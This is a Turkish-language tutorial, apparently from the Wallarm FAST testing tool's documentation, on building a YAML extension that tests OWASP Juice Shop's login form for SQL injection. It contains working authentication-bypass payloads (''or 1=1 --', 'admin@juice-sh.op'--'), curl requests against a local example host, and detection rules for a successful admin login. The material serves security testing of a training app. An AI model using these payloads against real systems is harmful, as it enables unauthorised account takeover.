[link-meta-info]:           ../create-extension.md#structure-of-the-meta-info-section
[link-send-headers]:        ../phase-send.md
[link-using-extension]:     ../using-extension.md
[link-app-examination]:     app-examination.md

[doc-send-phase]:           ../phase-send.md
[doc-detect-phase]:         ../detect/phase-detect.md

[link-juice-shop]:          https://www.owasp.org/index.php/OWASP_Juice_Shop_Project



#   Değişiklik Yapmayan Uzantının Oluşturulması

Bu belgede açıklanan uzantı, içine payload enjekte etmek için gelen temel (baseline) isteği değiştirmeyecektir. Bunun yerine, temel istekte belirtilen ana makineye önceden tanımlı iki test isteği gönderilecektir. Bu test istekleri, hedef uygulama [“OWASP Juice Shop”][link-juice-shop]’un oturum açma formundaki SQLi zafiyetinin istismarına yol açabilecek payload’lar içerir.


##  Hazırlıklar

FAST uzantısını oluşturmadan önce [hedef uygulamanın davranışını araştırmanız][link-app-examination] şiddetle önerilir.


##  Uzantının Oluşturulması

Uzantıyı tanımlayan bir dosya oluşturun (ör. `non-mod-extension.yaml`) ve gerekli bölümlerle doldurun:

1.  [**`meta-info` bölümü**][link-meta-info].

    Uzantının tespit etmeye çalışacağı zafiyetin açıklamasını hazırlayın.
    
    * zafiyet başlığı: `OWASP Juice Shop SQLi (non-mod extension)`
    * zafiyet açıklaması: `Demo of SQLi in OWASP Juice Shop (Admin Login)`
    * zafiyet türü: SQL enjeksiyonu
    * zafiyet tehdit seviyesi: yüksek
    
    İlgili `meta-info` bölümü aşağıdaki gibi görünmelidir:
    
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'
    ```
    
2.  **`send` bölümü, [Send aşaması][doc-send-phase]**

    Hedef uygulamadaki SQL enjeksiyonu zafiyetini istismar etmek için, herhangi bir `password` değeriyle birlikte `email` parametre değerinde gönderilmesi gereken iki payload vardır:
    
    * `'or 1=1 --`
    * `admin@juice-sh.op'--`
    
    İkisinin her biri aşağıdakileri içeren iki test isteği hazırlayabilirsiniz:
    
    * yukarıda açıklanan değerlerden birine sahip `email` parametresi ve 
    * rastgele bir değere sahip `password` parametresi.

    Örnek hedef uygulamayı (OWASP Juice Shop) test etmek için bu isteklerden sadece birini kullanmanız yeterlidir.
    
    Ancak, gerçek bir uygulamanın güvenlik testlerini yürütürken birkaç önceden hazırlanmış test isteğinden oluşan bir kümeye sahip olmak faydalı olabilir: uygulamadaki güncellemeler ve iyileştirmeler sayesinde isteklerden biri bir zafiyeti artık istismar edemiyorsa, kullanılan diğer payload’lar nedeniyle zafiyeti hâlâ istismar edebilecek diğer test istekleri mevcut olacaktır.

    Yukarıdaki listedeki ilk payload ile istek aşağıdakine benzer:
    
    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"'\''or 1=1 --", "password":"12345"}'
    ```

    İkinci istek de ilkine benzer görünür:

    ```
    curl --request POST --url http://ojs.example.local/rest/user/login \
         --header 'content-type: application/json' \
         --header 'host: ojs.example.local' \
         --data '{"email":"admin@juice-sh.op'\''--", "password":"12345"}'
    ```

    Bu iki test isteğinin tanımlarını içeren `send` bölümünü ekleyin:
    
    ```
    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'
    ``` 
    
    !!! info "`Host` başlığı hakkında bir not" 
        Bu zafiyetin istismarını etkilemediği için bu isteklerde `Host` başlığı atlanabilir. Bir FAST düğümü, gelen temel istekten çıkarılan `Host` başlığını otomatik olarak ekleyecektir.
        
        Send aşamasının isteğin başlıklarını nasıl ele aldığını [buradan][link-send-headers] okuyun.

     3.  **`detect` bölümü, [Detect aşaması][doc-detect-phase]**.
    
    Aşağıdaki koşullar, yönetici haklarıyla kullanıcı kimlik doğrulamasının başarılı olduğunu gösterir:
    
    * Yanıt gövdesinde değeri `1` olan alışveriş sepeti tanımlayıcı parametresinin bulunması. Parametre JSON formatındadır ve aşağıdaki gibi görünmelidir:
    
        ```
        "bid":1
        ```
    
    * Yanıt gövdesinde değeri `admin@juice-sh.op` olan kullanıcı e-posta parametresinin bulunması. Parametre JSON formatındadır ve aşağıdaki gibi görünmelidir:
    
        ```
         "umail":"admin@juice-sh.op"
        ```
    
    Yukarıda açıklanan koşullara göre saldırının başarılı olup olmadığını kontrol eden `detect` bölümünü ekleyin.
    
    ```
    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```
    
!!! info "Özel sembollerin kaçışlanması"
    Dizelerdeki özel sembolleri kaçışlamayı unutmayın.

##  Uzantı Dosyası

Artık `non-mod-extension.yaml` dosyası, uzantının çalışması için gereken bölümlerin eksiksiz bir setini içeriyor. Dosya içeriğinin listesi aşağıda gösterilmiştir:

??? info "non-mod-extension.yaml"
    ```
    meta-info:
      - type: sqli
      - threat: 80
      - title: 'OWASP Juice Shop SQLi (non-mod extension)'
      - description: 'Demo of SQLi in OWASP Juice Shop (Admin Login)'

    send:
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"''or 1=1 --","password":"12345"}'
      - method: 'POST'
        url: '/rest/user/login'
        headers:
        - 'Content-Type': 'application/json'
        body: '{"email":"admin@juice-sh.op''--","password":"12345"}'

    detect:
      - response:
        - body: "\"umail\":\"admin@juice-sh.op\""
        - body: "\"bid\":1"
    ```

##  Uzantının Kullanımı

Oluşturulan ifadenin nasıl kullanılacağı hakkında ayrıntılı bilgi için [bu belgeyi][link-using-extension] okuyun.